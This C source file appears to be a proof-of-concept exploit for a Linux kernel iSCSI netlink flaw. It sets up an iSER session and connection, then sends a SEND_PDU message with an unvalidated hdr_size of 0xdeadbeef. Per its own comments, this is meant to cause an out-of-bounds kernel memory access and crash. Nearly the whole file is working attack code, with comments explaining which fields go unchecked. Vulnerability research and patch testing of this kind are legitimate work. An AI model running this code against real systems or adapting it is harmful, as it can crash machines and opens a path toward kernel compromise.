#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/netlink.h>
#include <sched.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/un.h>
#include <syscall.h>
#include <unistd.h>

#include "iscsi_if.h"
#include "common.h"

int setup_iscsi_connection(uint32_t *hostnop, uint32_t *sidp, uint32_t *cidp, int *sock_fdp, uint64_t *handlep)
{
	struct sockaddr_nl addr;
	struct nlmsghdr *nlh = NULL;
	struct iscsi_uevent * ev;
	char * buffer;

	uint32_t hostno, sid, cid;
	int i, sock_fd;
	uint64_t handle = 0;

	//Try to load the scsi_transport_iscsi and ib_iser modules
	sock_fd = socket(PF_NETLINK, SOCK_DGRAM, NETLINK_RDMA);
	if(sock_fd >= 0)
		close(sock_fd);

	sock_fd = socket(PF_NETLINK, SOCK_RAW, NETLINK_ISCSI);
	if(sock_fd < 0) {
		printf("Failed to get a NETLINK_ISCSI socket (errno %d: %s)\n", errno, strerror(errno));
		return -1;
	}

	buffer = (void *)(nlh = (struct nlmsghdr *)malloc(NLMSG_LENGTH(MSG_SIZE)));
	if(!buffer) {
		printf("Failed to get memory for message buffer (errno %d: %s)\n", errno, strerror(errno));
		return -1;
	}

	//Get the handle of a iscsi transport
	for(i = 0; handle == 0 && i < 5; i++) {
		handle = get_iser_transport_handle();
		if(handle == 0) {
			//Sometimes it takes a few seconds for the transport to be available
			sleep(1); //after we've created the NETLINK_RDMA socket
		}
	}
	if(handle == 0) {
		printf("Failed to read an iscsi driver handle\n");
		return -1;
	}
	printf("Got iscsi iser transport handle 0x%lx\n", handle);

	//Bind the socket
	memset(&addr, 0, sizeof(addr));
	addr.nl_family = AF_NETLINK;
	addr.nl_pid = getpid();
	bind(sock_fd, (struct sockaddr*)&addr, sizeof(addr));

	////////////////////////////////////////////////////////
	// Send the create session message /////////////////////
	////////////////////////////////////////////////////////

	//Setup the netlink message header
	memset(nlh, 0, NLMSG_LENGTH(MSG_SIZE));
	nlh->nlmsg_len = NLMSG_LENGTH(MSG_SIZE);
	nlh->nlmsg_pid = getpid();
	nlh->nlmsg_flags = NLM_F_REQUEST;
	nlh->nlmsg_type = ISCSI_UEVENT_CREATE_SESSION;

	//Send the create session message
	ev = (struct iscsi_uevent *)NLMSG_DATA(nlh);
	ev->type = ISCSI_UEVENT_CREATE_SESSION;
	ev->iferror = 0;
	ev->transport_handle = handle;
	ev->u.c_session.initial_cmdsn = 0;
	ev->u.c_session.cmds_max = 0x10;
	ev->u.c_session.queue_depth = 0x10;
	send_netlink_msg(sock_fd, nlh);

	//Read the response to get the sid and hostno
	read_response(sock_fd, nlh);
	sid = ev->r.c_session_ret.sid;
	hostno = ev->r.c_session_ret.host_no;
	printf("Created session - sid %u - hostno %u\n", sid, hostno);

	////////////////////////////////////////////////////////
	// Send the create connection message //////////////////
	////////////////////////////////////////////////////////

	//Setup the netlink message header
	memset(nlh, 0, NLMSG_LENGTH(MSG_SIZE));
	nlh->nlmsg_len = NLMSG_LENGTH(MSG_SIZE);
	nlh->nlmsg_pid = getpid();
	nlh->nlmsg_flags = NLM_F_REQUEST;
	nlh->nlmsg_type = ISCSI_UEVENT_CREATE_CONN;

	//Send the create connection message
	ev = (struct iscsi_uevent *)NLMSG_DATA(nlh);
	ev->type = ISCSI_UEVENT_CREATE_CONN;
	ev->iferror = 0;
	ev->transport_handle = handle;
	ev->u.c_conn.sid = sid;
	ev->u.c_conn.cid = 0x12345;
	send_netlink_msg(sock_fd, nlh);

	//Read the response to get the sid and hostno
	read_response(sock_fd, nlh);
	cid = ev->r.c_conn_ret.cid;
	printf("Created connection - hostno %u - sid %u - cid %u\n", hostno, sid, cid);

	free(buffer);

	//Save to the output parameters and return
	*hostnop = hostno;
	*sidp = sid;
	*cidp = cid;
	*sock_fdp = sock_fd;
	*handlep = handle;
	return 0;
}


int send_pdu_msg(uint32_t hostno, uint32_t sid, uint32_t cid, int sock_fd, uint64_t handle)
{
	// arbitrary message size
#define MSG_DATA_SIZE 0x10

	int msg_size;
	struct nlmsghdr *nlh = NULL;
	struct iscsi_uevent * ev;
	unsigned char * msg_buffer, * msg_data;

	//Setup the netlink message header
	nlh = (struct nlmsghdr *)malloc(2*MSG_SIZE);
	msg_buffer = (unsigned char *)nlh;

	msg_size = sizeof(*nlh) + sizeof(struct iscsi_uevent) + 2 * MSG_DATA_SIZE;
	memset(nlh, 0, msg_size);
	nlh->nlmsg_len = msg_size;
	nlh->nlmsg_pid = getpid();
	nlh->nlmsg_flags = NLM_F_REQUEST;
	nlh->nlmsg_type = ISCSI_UEVENT_SEND_PDU;

	//Send the create connection message
	ev = (struct iscsi_uevent *)NLMSG_DATA(nlh);
	ev->type = ISCSI_UEVENT_SEND_PDU;
	ev->iferror = 0;
	ev->transport_handle = handle;
	ev->u.send_pdu.sid = sid;
	ev->u.send_pdu.cid = cid;
	//ev->u.send_pdu.hdr_size = MSG_DATA_SIZE;
	ev->u.send_pdu.hdr_size = 0xdeadbeef; // not validated, used to calculate location of "data"
	// data_size bounded at 0x2000, but can be longer than the provided data buffer
	ev->u.send_pdu.data_size = 0x1000;

	//Write the iscsi_hdr struct and data into msg_data
	msg_data = ((unsigned char *)ev) + sizeof(struct iscsi_uevent);
	// the first byte of will get processed as the opcode:
	// uint8_t opcode = hdr->opcode & ISCSI_OPCODE_MASK;
	// where the mask is 0x3f and we need 0x3 or 0x4
	memset(msg_data,                 0x43, MSG_DATA_SIZE);
	memset(msg_data + MSG_DATA_SIZE, 0x42, MSG_DATA_SIZE);

	//Send the message, don't expect to return
	send_netlink_msg_sized(sock_fd, nlh, msg_size);

	//Read the response, won't get here if the OOB access crashes
	read_response(sock_fd, nlh);
	printf("Return: - hostno %u - sid %u - cid %u - ret 0x%x\n", hostno, sid, cid, ev->r.retcode);

	return ev->r.retcode;
}

int main(int argc, char **argv) {
	int sock_fd;
	uint32_t hostno, sid, cid;
	uint64_t handle;

	bind_cpu();

	if(setup_iscsi_connection(&hostno, &sid, &cid, &sock_fd, &handle)) {
		printf("Failed to setup iscsi connection\n");
		return 1;
	}

	printf("Sending SEND_PDU message\n");
	fflush(stdout);
	usleep(10);

	// don't expect to return
	return send_pdu_msg(hostno, sid, cid, sock_fd, handle);
}

